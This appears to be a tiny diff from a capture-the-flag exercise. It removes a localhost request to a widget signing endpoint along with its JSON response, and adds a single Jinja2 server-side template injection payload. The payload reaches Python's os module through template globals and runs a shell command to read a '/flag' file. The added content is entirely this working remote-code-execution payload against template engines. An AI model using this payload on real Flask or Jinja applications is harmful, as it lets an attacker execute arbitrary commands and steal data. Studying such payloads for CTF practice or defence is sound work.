@@ -1,2 +1,1 @@
-http://127.0.0.1:40143/widget/sign/e?id=4000000000000&c=3646233799202&enc=EB4198EA855B17A9AC02AC565330598C&DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=id
-{"data":{"enc":"0C2E7078D125190DE97121EF206C0A88","signCode":"3280730556270"},"errorMsg":null,"msg":"success","result":1}
+{{lipsum.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
